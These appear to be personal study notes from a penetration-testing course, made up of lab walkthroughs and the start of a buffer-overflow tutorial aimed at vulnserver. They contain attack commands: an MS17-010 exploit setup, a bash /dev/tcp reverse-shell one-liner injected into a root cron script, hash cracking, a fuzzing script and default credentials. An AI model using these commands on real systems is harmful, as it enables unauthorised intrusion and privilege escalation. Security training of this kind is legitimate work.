> User: user
> Password: Password123!
> -----------------
> User: administrator
> Password: Password456!

**US Keyboard:**
![[Pasted image 20221227165418.png]]


### Walkthrough - Blue

![[Blue_Report.ctd.pdf]]

![[Pasted image 20221227174408.png]]

> [!info] 
> Manually: MS17-010 Exploit Code:
> https://github.com/3ndG4me/AutoBlue-MS17-010
> Install:
> `pip install -r requirements.txt`
> Check target:
> `python eternal_checker.py 172.16.215.130`
> `cd shellcode`
> `./shell_prep.sh `

![[Pasted image 20221227175110.png]]

![[Pasted image 20221227175900.png]]


### Set Up - Academy

> [!info] 
>  Default Settings
>  Use NAT for Network


### Walkthrough - Academy

> [!info] 
> Login:
> User & PW: root / tcm 
> Fetch new IP:
> `dhclient`
> Now find out which IP:
> `ip a`

> [!check] 
>` ftp <IP of Machine> `
>Try to login with `anonymous` as user and password
>Dictionarly listing with `ls`
>Fetch a file: `get note.txt`

> [!hint] 
> Hash Identifier:
> `hash-identifier`

> [!hint] 
> Cracking Hashes
> (Do it on base OS, because it should use GPU to crack it faster)
> `hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt`

> [!todo] 
> Enumeration Website with **dirb**
> It's using its own wordlist.
> `dirb http://192.168.138.129` 

> [!todo] 
> Enumeration Website with ffuf:
> This example only enumerate on first level.
> `ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.138.129/FUZZ` 

> [!info] 
> PHP Reverse Shell:
> https://github.com/pentestmonkey/php-reverse-shell
> Before Upload Change IP & Port
> Open Reverse Shell listener: `nc -nvlp 1234`

> [!info] 
> Privilage Escalation:
>  https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
>  

![[Pasted image 20230102125850.png]]
![[Pasted image 20230102130036.png]]
![[Pasted image 20230102130354.png]]
> [!info] 
> Check cron:
> `crontab -u root -l` 
> [!info] 
> Check systemctl:
> `systemctl list-timers` 

> [!info] 
> Linux Process Info:
>  https://github.com/DominicBreuker/pspy

> [!tip] 
> One line reverse shell:
>  `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`
>  Add reverse shell to backup.sh, because backup.sh is executed by root as crohn job every minute. Like this we can get root access on VM.



### Walkthrough - Dev

#### My own Report

![[Report_Dev.pdf]]


#### Guide from Video

> [!info] 
> Local File Inclution: https://www.exploit-db.com/exploits/48411
> 

![[Pasted image 20230102182616.png]]
![[Pasted image 20230102183026.png]]


### Walkthrough - Butler

#### Own Report

![[Own_Report_Butler.pdf]]



#### Video Walkthrough

> [!check] 
> Check what is default `user` and `pw` for Jenkins:
> It's `admin` and `password`

> [!hint] 
> In ZAP:
> Double click on entry to see body which was sent.  

![[Pasted image 20230107113814.png]]
![[Pasted image 20230107113922.png]]

![[Pasted image 20230107114447.png]]

> [!tip] 
> Check size of response 

![[Pasted image 20230107114807.png]]

> [!tip] 
> Jenkins Reverse shell script:
> revsh.groovy:
> https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76

> [!tip] 
> Windows Privilege Escalation Awesome Scripts
>  https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

![[Pasted image 20230107145617.png]]

> [!info] 
> It here is no quotes around path. Windows will try to execute C:\Program.exe, then   C:\Program Files.exe, then  C:\Program Files (x86).exe, .... and so on until it can execute. 

![[Pasted image 20230107150633.png]]

> [!check] 
> Services:
> `sc stop WiseBootAssistant`
>  sc query WiseBootAssistant`
>  `sc start WiseBootAssistant`

![[Pasted image 20230107151210.png]]


### Walkthrough - Blackpearl

#### Own Report

Not mucht findings...

![[Own_Report_Blackpearl.pdf]]


#### Video Walkthrough

> [!info] 
> Reverse DNS Lookup
> `dnsrecon -r 127.0.0.1/24 -n 192.168.203.131 -d blah`

![[Pasted image 20230108141950.png]]

![[Pasted image 20230108142253.png]]

> [!info] 
>`ffuf -w  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://blackpearl.tcm/FUZZ`
![[Pasted image 20230108175522.png]]

![[Pasted image 20230108175740.png]]

> [!hint] 
> Get full Full TTYs Shell
>  https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys
>  >
>  ![[Pasted image 20230108180440.png]]

> [!tip] 
> SUID can be run as like to be `owner` of this application! 

![[Pasted image 20230108181138.png]]

> [!tip] 
> Search for SUID 
> `find / -type f -perm -4000 2>/dev/null` 

![[Pasted image 20230108181533.png]]

> [!important] 
> GTFOBins
> https://gtfobins.github.io/#+suid

![[Pasted image 20230108181831.png]]

![[Pasted image 20230108182002.png]]
![[Pasted image 20230108182036.png]]



## Introduction to Exploit Development (Buffer Overflows)

### Required Installations

> [!note] 
> Download Windows ISO:
> https://www.microsoft.com/en-us/evalcenter/
> 
> Download Vulnserver:
> https://github.com/stephenbradshaw/vulnserver
> 
> Immunity Debugger:
> https://www.immunityinc.com/products/debugger/

> [!warning] 
>  Course Provider don't give support if not Windows 10 / Windows 2019 Server is used.
>  So ensure using this ISO's:
>  
>  Windows 2019 Server Evaluation (english)
>  https://software-download.microsoft.com/download/pr/17763.737.190906-2324.rs5_release_svc_refresh_SERVER_EVAL_x64FRE_en-us_1.iso
>  
>  Windows 10 Enterprise CLIENT Eval (english)
>  https://software-download.microsoft.com/download/pr/19041.264.200511-0456.vb_release_svc_refresh_CLIENTENTERPRISEEVAL_OEMRET_x64FRE_en-us.iso


### Buffer Overflows Explained

![[Pasted image 20230118064338.png]]
![[Pasted image 20230118064555.png]]
![[Pasted image 20230118064706.png]]
![[Pasted image 20230118064802.png]]

> [!info] 
> 1. Spiking - Find vulnerability in the program 
> 2. Fuzzing - Send a lot of characters to program to see if we can break it
> 3. Finding the Offset - See at which point we break it
> 4. Overwriting the EIP
> 5. Finding Bad Characters
> 6. Finding the Right Module
> 7. Generating Shellcode


### Spiking

![[Pasted image 20230118070013.png]]

![[Pasted image 20230118070316.png]]

![[Pasted image 20230118070435.png]]

`nc -nv <IP> 9999`

![[Pasted image 20230118070644.png]]

![[Pasted image 20230118071606.png]]

**stats.spk**
``` 
s_readline();
s_string("STATS ");
s_string_variable("0");
```

![[Pasted image 20230118071723.png]]

`generic_send_tcp <IP> 9999 stats.spk 0 0`

![[Pasted image 20230118071910.png]]

![[Pasted image 20230118072040.png]]

**trun.spk**
``` 
s_readline();
s_string("TRUN ");
s_string_variable("0");
```

![[Pasted image 20230121112236.png]]

> [!help] 
> Run Immunity Debugger and also vulnserver.exe as Administrator 

![[Pasted image 20230121143316.png]]

### Fuzzing

``` 
#!/usr/bin/python
 
import sys, socket
from time import sleep
 
buffer = "A" * 100
 
while True:
    try:
        payload = "TRUN /.:/" + buffer
 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.203.133',9999))
        print ("[+] Sending the payload...\n" + str(len(buffer)))
        s.send((payload.encode()))
        s.close()
        sleep(1)
        buffer = buffer + "A"*100
    except:
        print ("The fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()

```


![[Pasted image 20230121132259.png]]

### Finding the Offset

``` 
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 10000
```

``` 
#!/usr/bin/python
 
import sys, socket
 
offset = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk6Gk7Gk8Gk9Gl0Gl1Gl2Gl3Gl4Gl5Gl6Gl7Gl8Gl9Gm0Gm1Gm2Gm3Gm4Gm5Gm6Gm7Gm8Gm9Gn0Gn1Gn2Gn3Gn4Gn5Gn6Gn7Gn8Gn9Go0Go1Go2Go3Go4Go5Go6Go7Go8Go9Gp0Gp1Gp2Gp3Gp4Gp5Gp6Gp7Gp8Gp9Gq0Gq1Gq2Gq3Gq4Gq5Gq6Gq7Gq8Gq9Gr0Gr1Gr2Gr3Gr4Gr5Gr6Gr7Gr8Gr9Gs0Gs1Gs2Gs3Gs4Gs5Gs6Gs7Gs8Gs9Gt0Gt1Gt2Gt3Gt4Gt5Gt6Gt7Gt8Gt9Gu0Gu1Gu2Gu3Gu4Gu5Gu6Gu7Gu8Gu9Gv0Gv1Gv2Gv3Gv4Gv5Gv6Gv7Gv8Gv9Gw0Gw1Gw2Gw3Gw4Gw5Gw6Gw7Gw8Gw9Gx0Gx1Gx2Gx3Gx4Gx5Gx6Gx7Gx8Gx9Gy0Gy1Gy2Gy3Gy4Gy5Gy6Gy7Gy8Gy9Gz0Gz1Gz2Gz3Gz4Gz5Gz6Gz7Gz8Gz9Ha0Ha1Ha2Ha3Ha4Ha5Ha6Ha7Ha8Ha9Hb0Hb1Hb2Hb3Hb4Hb5Hb6Hb7Hb8Hb9Hc0Hc1Hc2Hc3Hc4Hc5Hc6Hc7Hc8Hc9Hd0Hd1Hd2Hd3Hd4Hd5Hd6Hd7Hd8Hd9He0He1He2He3He4He5He6He7He8He9Hf0Hf1Hf2Hf3Hf4Hf5Hf6Hf7Hf8Hf9Hg0Hg1Hg2Hg3Hg4Hg5Hg6Hg7Hg8Hg9Hh0Hh1Hh2Hh3Hh4Hh5Hh6Hh7Hh8Hh9Hi0Hi1Hi2Hi3Hi4Hi5Hi6Hi7Hi8Hi9Hj0Hj1Hj2Hj3Hj4Hj5Hj6Hj7Hj8Hj9Hk0Hk1Hk2Hk3Hk4Hk5Hk6Hk7Hk8Hk9Hl0Hl1Hl2Hl3Hl4Hl5Hl6Hl7Hl8Hl9Hm0Hm1Hm2Hm3Hm4Hm5Hm6Hm7Hm8Hm9Hn0Hn1Hn2Hn3Hn4Hn5Hn6Hn7Hn8Hn9Ho0Ho1Ho2Ho3Ho4Ho5Ho6Ho7Ho8Ho9Hp0Hp1Hp2Hp3Hp4Hp5Hp6Hp7Hp8Hp9Hq0Hq1Hq2Hq3Hq4Hq5Hq6Hq7Hq8Hq9Hr0Hr1Hr2Hr3Hr4Hr5Hr6Hr7Hr8Hr9Hs0Hs1Hs2Hs3Hs4Hs5Hs6Hs7Hs8Hs9Ht0Ht1Ht2Ht3Ht4Ht5Ht6Ht7Ht8Ht9Hu0Hu1Hu2Hu3Hu4Hu5Hu6Hu7Hu8Hu9Hv0Hv1Hv2Hv3Hv4Hv5Hv6Hv7Hv8Hv9Hw0Hw1Hw2Hw3Hw4Hw5Hw6Hw7Hw8Hw9Hx0Hx1Hx2Hx3Hx4Hx5Hx6Hx7Hx8Hx9Hy0Hy1Hy2Hy3Hy4Hy5Hy6Hy7Hy8Hy9Hz0Hz1Hz2Hz3Hz4Hz5Hz6Hz7Hz8Hz9Ia0Ia1Ia2Ia3Ia4Ia5Ia6Ia7Ia8Ia9Ib0Ib1Ib2Ib3Ib4Ib5Ib6Ib7Ib8Ib9Ic0Ic1Ic2Ic3Ic4Ic5Ic6Ic7Ic8Ic9Id0Id1Id2Id3Id4Id5Id6Id7Id8Id9Ie0Ie1Ie2Ie3Ie4Ie5Ie6Ie7Ie8Ie9If0If1If2If3If4If5If6If7If8If9Ig0Ig1Ig2Ig3Ig4Ig5Ig6Ig7Ig8Ig9Ih0Ih1Ih2Ih3Ih4Ih5Ih6Ih7Ih8Ih9Ii0Ii1Ii2Ii3Ii4Ii5Ii6Ii7Ii8Ii9Ij0Ij1Ij2Ij3Ij4Ij5Ij6Ij7Ij8Ij9Ik0Ik1Ik2Ik3Ik4Ik5Ik6Ik7Ik8Ik9Il0Il1Il2Il3Il4Il5Il6Il7Il8Il9Im0Im1Im2Im3Im4Im5Im6Im7Im8Im9In0In1In2In3In4In5In6In7In8In9Io0Io1Io2Io3Io4Io5Io6Io7Io8Io9Ip0Ip1Ip2Ip3Ip4Ip5Ip6Ip7Ip8Ip9Iq0Iq1Iq2Iq3Iq4Iq5Iq6Iq7Iq8Iq9Ir0Ir1Ir2Ir3Ir4Ir5Ir6Ir7Ir8Ir9Is0Is1Is2Is3Is4Is5Is6Is7Is8Is9It0It1It2It3It4It5It6It7It8It9Iu0Iu1Iu2Iu3Iu4Iu5Iu6Iu7Iu8Iu9Iv0Iv1Iv2Iv3Iv4Iv5Iv6Iv7Iv8Iv9Iw0Iw1Iw2Iw3Iw4Iw5Iw6Iw7Iw8Iw9Ix0Ix1Ix2Ix3Ix4Ix5Ix6Ix7Ix8Ix9Iy0Iy1Iy2Iy3Iy4Iy5Iy6Iy7Iy8Iy9Iz0Iz1Iz2Iz3Iz4Iz5Iz6Iz7Iz8Iz9Ja0Ja1Ja2Ja3Ja4Ja5Ja6Ja7Ja8Ja9Jb0Jb1Jb2Jb3Jb4Jb5Jb6Jb7Jb8Jb9Jc0Jc1Jc2Jc3Jc4Jc5Jc6Jc7Jc8Jc9Jd0Jd1Jd2Jd3Jd4Jd5Jd6Jd7Jd8Jd9Je0Je1Je2Je3Je4Je5Je6Je7Je8Je9Jf0Jf1Jf2Jf3Jf4Jf5Jf6Jf7Jf8Jf9Jg0Jg1Jg2Jg3Jg4Jg5Jg6Jg7Jg8Jg9Jh0Jh1Jh2Jh3Jh4Jh5Jh6Jh7Jh8Jh9Ji0Ji1Ji2Ji3Ji4Ji5Ji6Ji7Ji8Ji9Jj0Jj1Jj2Jj3Jj4Jj5Jj6Jj7Jj8Jj9Jk0Jk1Jk2Jk3Jk4Jk5Jk6Jk7Jk8Jk9Jl0Jl1Jl2Jl3Jl4Jl5Jl6Jl7Jl8Jl9Jm0Jm1Jm2Jm3Jm4Jm5Jm6Jm7Jm8Jm9Jn0Jn1Jn2Jn3Jn4Jn5Jn6Jn7Jn8Jn9Jo0Jo1Jo2Jo3Jo4Jo5Jo6Jo7Jo8Jo9Jp0Jp1Jp2Jp3Jp4Jp5Jp6Jp7Jp8Jp9Jq0Jq1Jq2Jq3Jq4Jq5Jq6Jq7Jq8Jq9Jr0Jr1Jr2Jr3Jr4Jr5Jr6Jr7Jr8Jr9Js0Js1Js2Js3Js4Js5Js6Js7Js8Js9Jt0Jt1Jt2Jt3Jt4Jt5Jt6Jt7Jt8Jt9Ju0Ju1Ju2Ju3Ju4Ju5Ju6Ju7Ju8Ju9Jv0Jv1Jv2Jv3Jv4Jv5Jv6Jv7Jv8Jv9Jw0Jw1Jw2Jw3Jw4Jw5Jw6Jw7Jw8Jw9Jx0Jx1Jx2Jx3Jx4Jx5Jx6Jx7Jx8Jx9Jy0Jy1Jy2Jy3Jy4Jy5Jy6Jy7Jy8Jy9Jz0Jz1Jz2Jz3Jz4Jz5Jz6Jz7Jz8Jz9Ka0Ka1Ka2Ka3Ka4Ka5Ka6Ka7Ka8Ka9Kb0Kb1Kb2Kb3Kb4Kb5Kb6Kb7Kb8Kb9Kc0Kc1Kc2Kc3Kc4Kc5Kc6Kc7Kc8Kc9Kd0Kd1Kd2Kd3Kd4Kd5Kd6Kd7Kd8Kd9Ke0Ke1Ke2Ke3Ke4Ke5Ke6Ke7Ke8Ke9Kf0Kf1Kf2Kf3Kf4Kf5Kf6Kf7Kf8Kf9Kg0Kg1Kg2Kg3Kg4Kg5Kg6Kg7Kg8Kg9Kh0Kh1Kh2Kh3Kh4Kh5Kh6Kh7Kh8Kh9Ki0Ki1Ki2Ki3Ki4Ki5Ki6Ki7Ki8Ki9Kj0Kj1Kj2Kj3Kj4Kj5Kj6Kj7Kj8Kj9Kk0Kk1Kk2Kk3Kk4Kk5Kk6Kk7Kk8Kk9Kl0Kl1Kl2Kl3Kl4Kl5Kl6Kl7Kl8Kl9Km0Km1Km2Km3Km4Km5Km6Km7Km8Km9Kn0Kn1Kn2Kn3Kn4Kn5Kn6Kn7Kn8Kn9Ko0Ko1Ko2Ko3Ko4Ko5Ko6Ko7Ko8Ko9Kp0Kp1Kp2Kp3Kp4Kp5Kp6Kp7Kp8Kp9Kq0Kq1Kq2Kq3Kq4Kq5Kq6Kq7Kq8Kq9Kr0Kr1Kr2Kr3Kr4Kr5Kr6Kr7Kr8Kr9Ks0Ks1Ks2Ks3Ks4Ks5Ks6Ks7Ks8Ks9Kt0Kt1Kt2Kt3Kt4Kt5Kt6Kt7Kt8Kt9Ku0Ku1Ku2Ku3Ku4Ku5Ku6Ku7Ku8Ku9Kv0Kv1Kv2Kv3Kv4Kv5Kv6Kv7Kv8Kv9Kw0Kw1Kw2Kw3Kw4Kw5Kw6Kw7Kw8Kw9Kx0Kx1Kx2Kx3Kx4Kx5Kx6Kx7Kx8Kx9Ky0Ky1Ky2Ky3Ky4Ky5Ky6Ky7Ky8Ky9Kz0Kz1Kz2Kz3Kz4Kz5Kz6Kz7Kz8Kz9La0La1La2La3La4La5La6La7La8La9Lb0Lb1Lb2Lb3Lb4Lb5Lb6Lb7Lb8Lb9Lc0Lc1Lc2Lc3Lc4Lc5Lc6Lc7Lc8Lc9Ld0Ld1Ld2Ld3Ld4Ld5Ld6Ld7Ld8Ld9Le0Le1Le2Le3Le4Le5Le6Le7Le8Le9Lf0Lf1Lf2Lf3Lf4Lf5Lf6Lf7Lf8Lf9Lg0Lg1Lg2Lg3Lg4Lg5Lg6Lg7Lg8Lg9Lh0Lh1Lh2Lh3Lh4Lh5Lh6Lh7Lh8Lh9Li0Li1Li2Li3Li4Li5Li6Li7Li8Li9Lj0Lj1Lj2Lj3Lj4Lj5Lj6Lj7Lj8Lj9Lk0Lk1Lk2Lk3Lk4Lk5Lk6Lk7Lk8Lk9Ll0Ll1Ll2Ll3Ll4Ll5Ll6Ll7Ll8Ll9Lm0Lm1Lm2Lm3Lm4Lm5Lm6L